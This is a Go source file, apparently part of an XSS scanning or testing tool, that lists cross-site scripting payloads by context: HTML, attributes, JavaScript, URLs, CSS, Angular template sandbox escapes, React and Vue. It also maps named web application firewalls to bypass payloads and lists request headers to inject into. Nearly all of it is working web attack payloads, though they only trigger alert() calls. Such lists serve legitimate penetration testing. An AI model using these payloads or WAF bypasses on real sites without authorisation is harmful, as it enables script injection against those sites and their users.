package payloads

// HTMLContextPayloads contains payloads for HTML context
var HTMLContextPayloads = []string{
	"<script>alert('XSS')</script>",
	"<script>alert(1)</script>",
	"<script>alert(document.domain)</script>",
	"<script>alert(document.cookie)</script>",
	"<svg onload=alert('XSS')>",
	"<img src=x onerror=alert('XSS')>",
	"<body onload=alert('XSS')>",
}

// AttributeContextPayloads contains payloads for attribute context
var AttributeContextPayloads = []string{
	"\" onmouseover=\"alert('XSS')\"",
	"\" onclick=\"alert('XSS')\"",
	"\" onerror=\"alert('XSS')\"",
	"\" onfocus=\"alert('XSS')\"",
	"\" onload=\"alert('XSS')\"",
	"\" autofocus onfocus=\"alert('XSS')\"",
	"'><script>alert('XSS')</script>",
	"\"><img src=x onerror=alert('XSS')>",
}

// JavaScriptContextPayloads contains payloads for JavaScript context
var JavaScriptContextPayloads = []string{
	"';alert('XSS');//",
	"\";alert('XSS');//",
	"\\';alert('XSS');//",
	"\\\";alert('XSS');//",
	"</script><script>alert('XSS')</script>",
	"'-alert('XSS')-'",
	"\"-alert('XSS')-\"",
	"alert('XSS')",
	"(alert)('XSS')",
	"alert(document.domain)",
}

// URLContextPayloads contains payloads for URL context
var URLContextPayloads = []string{
	"javascript:alert('XSS')",
	"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
	"vbscript:alert('XSS')",
	"javascript:prompt('XSS')",
	"javascript:confirm('XSS')",
}

// CSSContextPayloads contains payloads for CSS context
var CSSContextPayloads = []string{
	"</style><script>alert('XSS')</script>",
	"</style><img src=x onerror=alert('XSS')>",
	"</style><svg onload=alert('XSS')>",
	"</style><body onload=alert('XSS')>",
	"</style><iframe src=\"javascript:alert('XSS')\"></iframe>",
}

// AngularPayloads contains payloads for Angular.js applications
var AngularPayloads = []string{
	"{{constructor.constructor('alert(\"XSS\")')()}}",
	"{{[].pop.constructor('alert(\"XSS\")')()}}",
	"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\._){window\\\\._=1;alert(\"XSS\")}')+'\"')}}",
	"{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(\"XSS\")')()}}",
	"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(\\\"XSS\\\")\"].sort(toString.constructor)}}",
}

// ReactPayloads contains payloads for React.js applications
var ReactPayloads = []string{
	"\"><img src=x onerror=alert('XSS')>",
	"\"><svg onload=alert('XSS')>",
	"\"dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(\"XSS\")>'}}",
	"\"dangerouslySetInnerHTML={{__html:'<svg onload=alert(\"XSS\")>'}}",
}

// VuePayloads contains payloads for Vue.js applications
var VuePayloads = []string{
	"v-html=\"'<img src=x onerror=alert(\"XSS\")>'\"",
	"v-html=\"'<svg onload=alert(\"XSS\")>'\"",
	"\"><img src=x onerror=alert('XSS')>",
	"\"><svg onload=alert('XSS')>",
}

// DOMXSSPayloads contains payloads for DOM-based XSS
var DOMXSSPayloads = []string{
	"<img src=x onerror=alert('XSS')>",
	"<svg onload=alert('XSS')>",
	"<iframe src=\"javascript:alert('XSS')\"></iframe>",
	"<script>alert('XSS')</script>",
	"<body onload=alert('XSS')>",
}



// AdvancedWAFBypassPayloads contains advanced payloads for bypassing WAFs
var AdvancedWAFBypassPayloads = map[string]string{
	"Cloudflare": "<svg/onload=alert('XSS')>",
	"Akamai": "<svg/onload=alert`XSS`>",
	"Imperva": "<svg onload=alert%26%230000000040%26%230000000039%26%230000000041>",
	"F5": "<a href=\"j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:alert('XSS')\">",
	"ModSecurity": "<isindex type=image src=1 onerror=alert(1)>",
	"Generic": "<details open ontoggle=alert('XSS')>",
}

// CommonHeaders contains common headers that might be vulnerable to XSS
var CommonHeaders = []string{
	"User-Agent",
	"Referer",
	"X-Forwarded-For",
	"X-Forwarded-Host",
	"X-Forwarded-Proto",
	"X-Requested-With",
	"Origin",
	"Accept",
	"Accept-Language",
	"Cookie",
}
